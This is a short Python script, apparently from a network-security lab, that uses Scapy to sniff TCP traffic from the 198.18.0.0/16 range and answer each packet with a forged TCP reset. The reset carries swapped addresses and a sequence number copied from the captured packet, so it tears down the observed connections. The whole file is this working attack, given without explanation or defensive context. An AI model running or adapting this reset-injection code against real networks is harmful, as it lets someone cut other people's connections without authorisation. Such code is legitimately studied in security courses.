#!/usr/bin/python
from scapy.all import *
def spoof_tcp(pkt):
  IPLayer=IP(dst=pkt[IP].src, src=pkt[IP].dst)
  TCPLayer = TCP(flags="R", seq=pkt[TCP].ack,
  dport=pkt[TCP].sport,sport=pkt[TCP].dport)
  spoofpkt=IPLayer/TCPLayer
  send(spoofpkt,verbose=0)
  print("send!!")
pkt=sniff(filter='tcp and src net 198.18.0.0/16',prn=spoof_tcp)
